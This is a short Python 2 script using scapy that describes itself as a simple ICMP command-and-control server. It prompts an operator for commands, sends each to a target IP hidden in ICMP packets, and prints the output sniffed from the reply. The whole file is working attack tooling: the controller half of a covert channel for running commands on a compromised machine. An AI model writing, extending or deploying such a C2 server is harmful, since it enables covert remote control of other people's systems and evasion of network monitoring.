from scapy.all import *
def banner():
	print """
.####..######..##.....##.########......######....####.....######.
..##..##....##.###...###.##.....##....##....##..##..##...##....##
..##..##.......####.####.##.....##....##.........####....##......
..##..##.......##.###.##.########.....##........####.....##......
..##..##.......##.....##.##...........##.......##..##.##.##......
..##..##....##.##.....##.##...........##....##.##...##...##....##
.####..######..##.....##.##............######...####..##..######.


"""		
	print "This is a simple C&C (Command and Control) by ICMP."
	print "Written By @Dmitriy_Area51"
def pattern():
	print "Please Enter Target IP :"
	print "Example :"
	print "#python server.py [Target IP]"
	print "Enter 'end' command for end server and 'finish' for both (server and client)."
if (len(sys.argv))<2:
	banner()
	pattern()
else:
	target=sys.argv[1]
	banner()
	while 1:
		c=raw_input("Enter your command : ")
		if c=='end':
			break
		elif c=="finish":
			send(IP(src="192.168.43.1",dst=target)/ICMP()/c)
			break
		else:
			send(IP(src="192.168.43.1",dst=target)/ICMP()/c)
			s=sniff(count=1,filter="icmp")
			s1=str(s[0]).split("'")[1]
			s2=s1.split("\\n")
			for i in s2:
				print i
